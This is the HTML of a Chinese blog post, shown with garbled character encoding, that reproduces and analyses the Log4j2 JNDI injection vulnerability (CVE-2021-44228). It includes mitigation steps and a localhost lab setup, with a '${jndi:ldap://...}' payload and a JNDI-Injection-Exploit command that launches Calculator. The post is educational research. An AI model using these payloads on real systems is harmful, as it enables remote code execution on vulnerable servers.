<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Log4j2æ¼æ´å¤ç°åŠåŸç†åˆ†æ | Reus09&#39;s Blog</title>
<meta name="keywords" content="log4j2">
<meta name="description" content="0x00 å‰è¨€ æœ€è¿‘æ—¶é—´æ¯”è¾ƒå……æ²›ï¼Œå› æ­¤åœ¨è¿™é‡Œå¤ç°ä¸€äº›æµä¼ æ¯”è¾ƒå¹¿æ³›ã€å±å®³æ€§é«˜çš„æ¼æ´ï¼ŒLog4j2æ¼æ´ä½œä¸º2021å¹´çˆ†å‡ºæ¥çš„CVEæ˜æ˜Ÿï¼Œè‹¦äºå½“æ—¶æ—¶é—´ç´§è¿«ï¼Œ">
<meta name="author" content="Reus09">
<link rel="canonical" href="http://www.reus09.top/posts/tech/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.40573d180b208ab15c3bf0a170c2ac86aa8ccf179f96f939352198fbee79100e.css" integrity="sha256-QFc9GAsgirFcO/ChcMKshqqMzxeflvk5NSGY&#43;&#43;55EA4=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="icon" type="image/png" sizes="16x16" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="icon" type="image/png" sizes="32x32" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="apple-touch-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="mask-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="Log4j2æ¼æ´å¤ç°åŠåŸç†åˆ†æ" />
<meta property="og:description" content="0x00 å‰è¨€ æœ€è¿‘æ—¶é—´æ¯”è¾ƒå……æ²›ï¼Œå› æ­¤åœ¨è¿™é‡Œå¤ç°ä¸€äº›æµä¼ æ¯”è¾ƒå¹¿æ³›ã€å±å®³æ€§é«˜çš„æ¼æ´ï¼ŒLog4j2æ¼æ´ä½œä¸º2021å¹´çˆ†å‡ºæ¥çš„CVEæ˜æ˜Ÿï¼Œè‹¦äºå½“æ—¶æ—¶é—´ç´§è¿«ï¼Œ" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://www.reus09.top/posts/tech/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-09-18T17:01:52+08:00" />
<meta property="article:modified_time" content="2022-09-18T17:01:52+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Log4j2æ¼æ´å¤ç°åŠåŸç†åˆ†æ"/>
<meta name="twitter:description" content="0x00 å‰è¨€ æœ€è¿‘æ—¶é—´æ¯”è¾ƒå……æ²›ï¼Œå› æ­¤åœ¨è¿™é‡Œå¤ç°ä¸€äº›æµä¼ æ¯”è¾ƒå¹¿æ³›ã€å±å®³æ€§é«˜çš„æ¼æ´ï¼ŒLog4j2æ¼æ´ä½œä¸º2021å¹´çˆ†å‡ºæ¥çš„CVEæ˜æ˜Ÿï¼Œè‹¦äºå½“æ—¶æ—¶é—´ç´§è¿«ï¼Œ"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "ğŸ“šæ–‡ç« ",
      "item": "http://www.reus09.top/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "ğŸ‘¨ğŸ»â€ğŸ’»æŠ€æœ¯",
      "item": "http://www.reus09.top/posts/tech/"
    }, 
    {
      "@type": "ListItem",
      "position":  4 ,
      "name": "Log4j2æ¼æ´å¤ç°åŠåŸç†åˆ†æ",
      "item": "http://www.reus09.top/posts/tech/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Log4j2æ¼æ´å¤ç°åŠåŸç†åˆ†æ",
  "name": "Log4j2æ¼æ´å¤ç°åŠåŸç†åˆ†æ",
  "description": "0x00 å‰è¨€ æœ€è¿‘æ—¶é—´æ¯”è¾ƒå……æ²›ï¼Œå› æ­¤åœ¨è¿™é‡Œå¤ç°ä¸€äº›æµä¼ æ¯”è¾ƒå¹¿æ³›ã€å±å®³æ€§é«˜çš„æ¼æ´ï¼ŒLog4j2æ¼æ´ä½œä¸º2021å¹´çˆ†å‡ºæ¥çš„CVEæ˜æ˜Ÿï¼Œè‹¦äºå½“æ—¶æ—¶é—´ç´§è¿«ï¼Œ",
  "keywords": [
    "log4j2"
  ],
  "articleBody": "0x00 å‰è¨€ æœ€è¿‘æ—¶é—´æ¯”è¾ƒå……æ²›ï¼Œå› æ­¤åœ¨è¿™é‡Œå¤ç°ä¸€äº›æµä¼ æ¯”è¾ƒå¹¿æ³›ã€å±å®³æ€§é«˜çš„æ¼æ´ï¼ŒLog4j2æ¼æ´ä½œä¸º2021å¹´çˆ†å‡ºæ¥çš„CVEæ˜æ˜Ÿï¼Œè‹¦äºå½“æ—¶æ—¶é—´ç´§è¿«ï¼Œæ²¡æœ‰æ—¶é—´è¿›è¡Œå­¦ä¹ ï¼Œç°åœ¨ç³»ç»Ÿæ€§çš„å­¦ä¹ ä¸€ä¸‹log4j2çš„æ¼æ´åŸç†,å¤ç°è¿‡ç¨‹,å…·ä½“ä½¿ç”¨çš„ä¸€äº›å§¿åŠ¿ã€‚\n0x01 æ¼æ´æè¿° Apache Log4j2 æ˜¯ Apache è½¯ä»¶åŸºé‡‘ä¼šä¸‹çš„ä¸€ä¸ªå¼€æºçš„åŸºäº Java çš„æ—¥å¿—è®°å½•å·¥å…·ã€‚Log4j2 æ˜¯ä¸€ä¸ª Log4j 1.x çš„é‡å†™ï¼Œå¹¶ä¸”å¼•å…¥äº†å¤§é‡ä¸°å¯Œçš„ç‰¹æ€§ã€‚è¯¥æ—¥å¿—æ¡†æ¶è¢«å¤§é‡ç”¨äºä¸šåŠ¡ç³»ç»Ÿå¼€å‘ï¼Œç”¨æ¥è®°å½•æ—¥å¿—ä¿¡æ¯ã€‚ç”±äºå…¶ä¼˜å¼‚çš„æ€§èƒ½è€Œè¢«å¹¿æ³›çš„åº”ç”¨äºå„ç§å¸¸è§çš„ Web æœåŠ¡ä¸­ã€‚\n2021 å¹´ 12 æœˆ 9 æ—¥æ™šï¼ŒLog4j2 çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´çš„åˆ©ç”¨ç»†èŠ‚è¢«å…¬å¼€ã€‚æ”»å‡»è€…ä½¿ç”¨ ${} å…³é”®æ ‡è¯†ç¬¦è§¦å‘ JNDI æ³¨å…¥æ¼æ´ï¼Œå½“ç¨‹åºå°†ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¿›è¡Œæ—¥å¿—è®°å½•æ—¶ï¼Œå³å¯è§¦å‘æ­¤æ¼æ´ï¼ŒæˆåŠŸåˆ©ç”¨æ­¤æ¼æ´å¯ä»¥åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚\nç”±äºå…¶è§¦å‘æ–¹å¼ç®€å•ã€ä½¿ç”¨èŒƒå›´å¹¿æ³›ï¼Œå› æ­¤æ¼æ´å±å®³æå¤§ã€‚\nç›®å‰ï¼Œå·²ç»ä¸ºæ­¤æ¼æ´é¢å‘äº† CVE ç¼–å·ï¼š[CVE-2021-44228](https://www.cve.org/CVERecord?id=CVE-2021-44228)ï¼Œæ ¹æ®å®˜æ–¹å®‰å…¨å…¬å‘Šï¼Œä»¥ä¸‹ä¸ºç›¸å…³ä¿¡æ¯ï¼š - æ¼æ´ï¼šLog4j2 çš„ JNDI åŠŸèƒ½ç‚¹æ— æ³•é˜²å¾¡æ¥è‡ªæ”»å‡»è€…çš„ ldap ä»¥åŠå…¶ä»–ç›¸å…³ç«¯ç‚¹çš„æ”»å‡»è¡Œä¸ºã€‚ - ä¸¥é‡ç­‰çº§ï¼šCritical - Basic CVSS è¯„åˆ†ï¼š10.0 CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H - å½±å“ç‰ˆæœ¬ï¼šall versions from 2.0-beta9 to 2.14.1 - è¯¦æƒ…æè¿°ï¼šApache Log4j2 \u003c=2.14.1 ç‰ˆæœ¬æä¾›çš„ JNDI ç‰¹æ€§ç”¨äºé…ç½®ã€æ—¥å¿—ä¿¡æ¯ã€å‚æ•°ä½ç½®æ—¶ï¼Œæ— æ³•é˜²æŠ¤æ”»å‡»è€…ä½¿ç”¨ ldap æˆ–å…¶ä»– JNDI ç›¸å…³æ–­ç‚¹çš„æ”»å‡»è¡Œä¸ºã€‚æ”»å‡»è€…å¦‚æœå¯ä»¥æ§åˆ¶æ—¥å¿—ä¿¡æ¯æˆ–æ—¥å¿—ä¿¡æ¯å‚æ•°ï¼Œåˆ™å¯ä»¥åœ¨å¼€å¯äº† lookup substitution åŠŸèƒ½æ—¶åˆ©ç”¨æ¶æ„çš„ ladp æœåŠ¡å™¨æ‰§è¡Œä»»æ„ä»£ç ï¼Œåœ¨ 2.15.0 ç‰ˆæœ¬æ—¶ï¼Œé»˜è®¤å°†å…¶æ­¤è¡Œä¸ºå…³é—­ã€‚ - ç¼“è§£æªæ–½ï¼šåœ¨ \u003e= 2.10 ç‰ˆæœ¬ï¼Œå¯ä»¥é€šè¿‡è®¾ç½®ç³»ç»Ÿå±æ€§ log4j2.formatMsgNoLookups æˆ–ç¯å¢ƒå˜é‡ LOG4J_FORMAT_MSG_NO_LOOKUPS ä¸º true æ¥ç¼“è§£ã€‚åœ¨ 2.0-beta9 to 2.10.0 ç‰ˆæœ¬ï¼Œå¯ä»¥é€šè¿‡ç§»é™¤ classpath ä¸­çš„ JndiLookup ç±»æ¥ç¼“è§£ï¼Œå‘½ä»¤ä¸ºï¼šzip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.classã€‚\n0x02 å‰ç½®çŸ¥è¯† JNDIå…¨ç§° Java Naming and Directory Interfaceã€‚\nJNDIæ˜¯Javaå¹³å°çš„ä¸€ä¸ªæ ‡å‡†æ‰©å±•ï¼Œæä¾›äº†ä¸€ç»„æ¥å£ã€ç±»å’Œå…³äºå‘½åç©ºé—´çš„æ¦‚å¿µã€‚å¦‚åŒå…¶å®ƒå¾ˆå¤šJavaæŠ€æœ¯ä¸€æ ·ï¼ŒJDNIæ˜¯provider-basedçš„æŠ€æœ¯ï¼Œæš´éœ²äº†ä¸€ä¸ªAPIå’Œä¸€ä¸ªæœåŠ¡ä¾›åº”æ¥å£ï¼ˆSPIï¼‰ã€‚è¿™æ„å‘³ç€ä»»ä½•åŸºäºåå­—çš„æŠ€æœ¯éƒ½èƒ½é€šè¿‡JNDIè€Œæä¾›æœåŠ¡ï¼Œåªè¦JNDIæ”¯æŒè¿™é¡¹æŠ€æœ¯ã€‚JNDIç›®å‰æ‰€æ”¯æŒçš„æŠ€æœ¯åŒ…æ‹¬LDAPã€CORBA Common Object Serviceï¼ˆCOSï¼‰åå­—æœåŠ¡ã€RMIã€NDSã€DNSã€Windowsæ³¨å†Œè¡¨ç­‰ç­‰ã€‚å¾ˆå¤šJ2EEæŠ€æœ¯ï¼ŒåŒ…æ‹¬EJBéƒ½ä¾é JNDIæ¥ç»„ç»‡å’Œå®šä½å®ä½“ã€‚ JDNIé€šè¿‡ç»‘å®šçš„æ¦‚å¿µå°†å¯¹è±¡å’Œåç§°è”ç³»èµ·æ¥ã€‚åœ¨ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œæ–‡ä»¶åè¢«ç»‘å®šç»™æ–‡ä»¶ã€‚åœ¨DNSä¸­ï¼Œä¸€ä¸ªIPåœ°å€ç»‘å®šä¸€ä¸ªURLã€‚åœ¨ç›®å½•æœåŠ¡ä¸­ï¼Œä¸€ä¸ªå¯¹è±¡åè¢«ç»‘å®šç»™ä¸€ä¸ªå¯¹è±¡å®ä½“ã€‚ JNDIä¸­çš„ä¸€ç»„ç»‘å®šä½œä¸ºä¸Šä¸‹æ–‡æ¥å¼•ç”¨ã€‚æ¯ä¸ªä¸Šä¸‹æ–‡æš´éœ²çš„ä¸€ç»„æ“ä½œæ˜¯ä¸€è‡´çš„ã€‚ä¾‹å¦‚ï¼Œæ¯ä¸ªä¸Šä¸‹æ–‡æä¾›äº†ä¸€ä¸ªæŸ¥æ‰¾æ“ä½œï¼Œè¿”å›æŒ‡å®šåå­—çš„ç›¸åº”å¯¹è±¡ã€‚æ¯ä¸ªä¸Šä¸‹æ–‡éƒ½æä¾›äº†ç»‘å®šå’Œæ’¤é™¤ç»‘å®šåå­—åˆ°æŸä¸ªå¯¹è±¡çš„æ“ä½œã€‚JNDIä½¿ç”¨é€šç”¨çš„æ–¹å¼æ¥æš´éœ²å‘½åç©ºé—´ï¼Œå³ä½¿ç”¨åˆ†å±‚ä¸Šä¸‹æ–‡ä»¥åŠä½¿ç”¨ç›¸åŒå‘½åè¯­æ³•çš„å­ä¸Šä¸‹æ–‡ã€‚ è¯´äººè¯å°±æ˜¯: JDNI æŒ‡å‘çš„æŸä¸ªå¯¹è±¡ï¼Œå³ä¸ºæˆ‘ä»¬çš„æœåŠ¡ ç›®å½•æœåŠ¡æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ•°æ®åº“ï¼Œç”¨æ¥ä¿å­˜æè¿°æ€§çš„ã€åŸºäºå±æ€§çš„è¯¦ç»†ä¿¡æ¯ï¼Œæ”¯æŒè¿‡æ»¤åŠŸèƒ½ã€‚\nLDAPï¼ˆLight Directory Access Portocolï¼‰ï¼Œå®ƒæ˜¯åŸºäºX.500æ ‡å‡†çš„è½»é‡çº§ç›®å½•è®¿é—®åè®®ã€‚\nç›®å½•æ˜¯ä¸€ä¸ªä¸ºæŸ¥è¯¢ã€æµè§ˆå’Œæœç´¢è€Œä¼˜åŒ–çš„æ•°æ®åº“ï¼Œå®ƒæˆæ ‘çŠ¶ç»“æ„ç»„ç»‡æ•°æ®ï¼Œç±»ä¼¼æ–‡ä»¶ç›®å½•ä¸€æ ·ã€‚ ç›®å½•æ•°æ®åº“å’Œå…³ç³»æ•°æ®åº“ä¸åŒï¼Œå®ƒæœ‰ä¼˜å¼‚çš„è¯»æ€§èƒ½ï¼Œä½†å†™æ€§èƒ½å·®ï¼Œå¹¶ä¸”æ²¡æœ‰äº‹åŠ¡å¤„ç†ã€å›æ»šç­‰å¤æ‚åŠŸèƒ½ï¼Œä¸é€‚äºå­˜å‚¨ä¿®æ”¹é¢‘ç¹çš„æ•°æ®ã€‚ æ‰€ä»¥ç›®å½•å¤©ç”Ÿæ˜¯ç”¨æ¥æŸ¥è¯¢çš„ï¼Œå°±å¥½è±¡å®ƒçš„åå­—ä¸€æ ·ã€‚ LDAPç›®å½•æœåŠ¡æ˜¯ç”±ç›®å½•æ•°æ®åº“å’Œä¸€å¥—è®¿é—®åè®®ç»„æˆçš„ç³»ç»Ÿã€‚ 0x03 æ¼æ´å¤ç° è¿™é‡Œå…ˆæ€»ä½“è®²ä¸€ä¸‹log4j2æ¼æ´æ”»å‡»çš„æ•´ä¸ªæµç¨‹ã€‚ Log4j2é»˜è®¤æ”¯æŒè§£ældap/rmiåè®®ï¼ˆåªè¦æ‰“å°çš„æ—¥å¿—ä¸­åŒ…æ‹¬ldap/rmiåè®®å³å¯ï¼‰ï¼Œå¹¶ä¼šé€šè¿‡åç§°ä»ldapæœåŠ¡ç«¯å…¶è·å–å¯¹åº”çš„Classæ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨ClassLoaderåœ¨æœ¬åœ°åŠ è½½LdapæœåŠ¡ç«¯è¿”å›çš„Classç±»ã€‚ è¿™å°±ä¸ºæ”»å‡»è€…æä¾›äº†æ”»å‡»é€”å¾„ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ç•Œé¢ä¼ å…¥ä¸€ä¸ªåŒ…å«æ¶æ„å†…å®¹ï¼ˆä¼šæä¾›ä¸€ä¸ªæ¶æ„çš„Classæ–‡ä»¶ï¼‰çš„ldapåè®®å†…å®¹ï¼ˆå¦‚ï¼šæ¶æ„å†…å®¹${jndi:ldap://localhost:9999/Test}æ¶æ„å†…å®¹ï¼‰ï¼Œè¯¥å†…å®¹ä¼ é€’åˆ°åç«¯è¢«log4j2æ‰“å°å‡ºæ¥ï¼Œå°±ä¼šè§¦å‘æ¶æ„çš„Classçš„åŠ è½½æ‰§è¡Œï¼ˆå¯æ‰§è¡Œä»»æ„åå°æŒ‡ä»¤ï¼‰ï¼Œä»è€Œè¾¾åˆ°æ”»å‡»çš„ç›®çš„ã€‚ log4jç¯å¢ƒæ­å»º æˆ‘ä»¬é‡‡å–mavenè¿›è¡Œæ­å»º\nåœ¨pom.xmlé‡Œé¢å†™å…¥log4j2çš„ç›¸å…³ä¾èµ–\norg.apache.logging.log4j log4j-api 2.14.1 org.apache.logging.log4j log4j-core 2.14.1 ç„¶åç»™å‡ºç¤ºä¾‹ä»£ç \nimport org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; public class main { private static final Logger logger = LogManager.getLogger(main.class); public static void main(String[] args) { // java ç‰ˆæœ¬è¿‡æœ¬ï¼Œç»™å®šçš„å‡ ä¸ªjavaç‰ˆæœ¬é»˜è®¤è®¾ç½®trustURLCodebaseä¸ºFalse System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\",\"true\"); logger.error(\"${jndi:ldap://127.0.0.1:1389/#exploit}\"); } } ç„¶åå€Ÿç”¨welk1nå¸ˆå‚…æä¾›çš„JDNIæ³¨å…¥é›†æˆå·¥å…·å¯åŠ¨æ¶æ„æœåŠ¡å™¨ï¼Œç”¨æ¥ç»™ ldap/rmi è°ƒç”¨è¿”å›æ¶æ„ä»£ç \njava -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \"open /System/Applications/Calculator.app\" -A \"127.0.0.1\":\nå°†ç”Ÿæˆçš„å¯åˆ©ç”¨çš„æ¶æ„æœåŠ¡å™¨ldapçš„åœ°å€:ldap://127.0.0.1:1389/up14yk\nä½¿ç”¨logger.error()æ¥è§¦å‘æ¼æ´\nå¯ä»¥çœ‹åˆ°æ¼æ´å¤ç°å®Œæ¯•ï¼Œåˆ©ç”¨æ–¹æ³•æ˜¯å¾ˆç®€å•çš„ï¼Œåªéœ€è¦log4j2ç‰ˆæœ¬æ»¡è¶³è¦æ±‚ï¼Œä¸€æ—¦åœ¨logå­—ç¬¦ä¸²ä¸­æ£€æµ‹åˆ°${}ï¼Œå°±ä¼šè§£æå…¶ä¸­çš„å­—ç¬¦ä¸²å°è¯•ä½¿ç”¨lookupæŸ¥è¯¢ï¼Œå› æ­¤åªè¦èƒ½æ§åˆ¶logå‚æ•°å†…å®¹ï¼Œå°±æœ‰æœºä¼šå®ç°æ¼æ´åˆ©ç”¨ã€‚\n0x04 æ¼æ´åŸç†åˆ†æ è¿™é‡Œä¸»è¦å‚è€ƒsu18å¤§ä½¬çš„å…³äºlog4j2æ¼æ´çš„åˆ†æã€‚ä¸»è¦å¯¹äºLog4j2å…³äºLookupåŠŸèƒ½çš„ä½¿ç”¨ä»¥åŠæ¼æ´çš„è§¦å‘å‡ ä¸ªå…³é”®ç‚¹è¿›è¡Œé˜è¿°ã€‚\né¦–å…ˆæŸ¥çœ‹æ¼æ´è§¦å‘å‡½æ•°æ ˆçš„è°ƒç”¨æƒ…å†µï¼Œæˆ‘ä»¬åœ¨æœ€åæ‰§è¡Œjndiè¿œç¨‹å‘½ä»¤æ‰§è¡Œçš„åœ°æ–¹æ‰“ä¸‹æ–­ç‚¹ã€‚\nlookup:172, JndiManager (org.apache.logging.log4j.core.net) lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup) lookup:221, Interpolator (org.apache.logging.log4j.core.lookup) resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup) substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup) substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup) replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup) format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern) format:38, PatternFormatter (org.apache.logging.log4j.core.pattern) toSerializable:344, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout) toText:244, PatternLayout (org.apache.logging.log4j.core.layout) encode:229, PatternLayout (org.apache.logging.log4j.core.layout) encode:59, PatternLayout (org.apache.logging.log4j.core.layout) directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config) callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config) callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config) callAppender:84, AppenderControl (org.apache.logging.log4j.core.config) callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config) processLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config) log:481, LoggerConfig (org.apache.logging.log4j.core.config) log:456, LoggerConfig (org.apache.logging.log4j.core.config) log:63, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config) log:161, Logger (org.apache.logging.log4j.core) tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi) logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi) logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi) logMessage:2017, AbstractLogger (org.apache.logging.log4j.spi) logIfEnabled:1983, AbstractLogger (org.apache.logging.log4j.spi) error:740, AbstractLogger (org.apache.logging.log4j.spi) main:18, main æ—¥å¿—è®°å½•/è§¦å‘ç‚¹ æ ¹æ®å‡½æ•°æ ˆï¼Œè¿™é‡Œæ˜¯æ ¹æ®loggerç­‰çº§è°ƒç”¨å¯¹åº”çš„æ–¹æ³•\næˆ‘ä»¬é€šè¿‡LogManager.getLogger()æ¥è·å–ä¸€ä¸ªLoggerå¯¹è±¡ï¼Œç„¶åè°ƒç”¨å…¶debug/info/error/warn/fatal/trace/log ç­‰æ–¹æ³•è®°å½•æ—¥å¿—ç­‰ä¿¡æ¯ã€‚è¿™äº›æ–¹æ³•ï¼Œéƒ½ä¼šé¦–å…ˆä½¿ç”¨org.apache.logging.log4j.spi.AbstractLogger#logIfEnabledçš„è‹¥å¹²ä¸ªé‡è½½æ–¹æ³•æ¥æ ¹æ®å½“å‰é…ç½®è®°å½•æ—¥å¿—ç­‰çº§ï¼Œåˆ¤æ–­æ˜¯å¦éœ€è¦è¾“å‡ºconsoleå’Œè®°å½•æ—¥å¿—æ–‡ä»¶ã€‚\nåœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œä¼šè¾“å‡º WARN/ERROR/FATAL ç­‰çº§çš„æ—¥å¿—ã€‚å¯ä»¥ä½¿ç”¨é…ç½®æ–‡ä»¶æ›´æ”¹æ—¥å¿—è¾“å‡ºç­‰çº§ï¼š\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e ",
  "wordCount" : "6119",
  "inLanguage": "en",
  "datePublished": "2022-09-18T17:01:52+08:00",
  "dateModified": "2022-09-18T17:01:52+08:00",
  "author":[{
    "@type": "Person",
    "name": "Reus09"
  }],
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://www.reus09.top/posts/tech/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Reus09's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://www.reus09.top" accesskey="h" title="Reus09&#39;s Blog (Alt + H)">Reus09&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://www.reus09.top/search" title="ğŸ”æœç´¢ (Alt &#43; /)" accesskey=/>
                    <span>ğŸ”æœç´¢</span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/" title="ğŸ ä¸»é¡µ">
                    <span>ğŸ ä¸»é¡µ</span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/posts" title="ğŸ“šæ–‡ç« ">
                    <span>ğŸ“šæ–‡ç« </span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/archives/" title="â±æ—¶é—´è½´">
                    <span>â±æ—¶é—´è½´</span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/categories" title="ğŸ§©åˆ†ç±»">
                    <span>ğŸ§©åˆ†ç±»</span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/tags" title="ğŸ”–æ ‡ç­¾">
                    <span>ğŸ”–æ ‡ç­¾</span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/about" title="ğŸ™‹ğŸ»â€â™‚ï¸å…³äº">
                    <span>ğŸ™‹ğŸ»â€â™‚ï¸å…³äº</span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/links" title="ğŸ¤å‹é“¾">
                    <span>ğŸ¤å‹é“¾</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://www.reus09.top">Home</a>&nbsp;Â»&nbsp;<a href="http://www.reus09.top/posts/">ğŸ“šæ–‡ç« </a>&nbsp;Â»&nbsp;<a href="http://www.reus09.top/posts/tech/">ğŸ‘¨ğŸ»â€ğŸ’»æŠ€æœ¯</a></div>
    <h1 class="post-title">
      Log4j2æ¼æ´å¤ç°åŠåŸç†åˆ†æ
    </h1>
    <div class="post-meta"><span title='2022-09-18 17:01:52 +0800 +0800'>2022-09-18</span>&nbsp;Â·&nbsp;13 min&nbsp;Â·&nbsp;Reus09

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">Table of Contents</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#0x00-%e5%89%8d%e8%a8%80" aria-label="0x00 å‰è¨€">0x00 å‰è¨€</a></li>
                    <li>
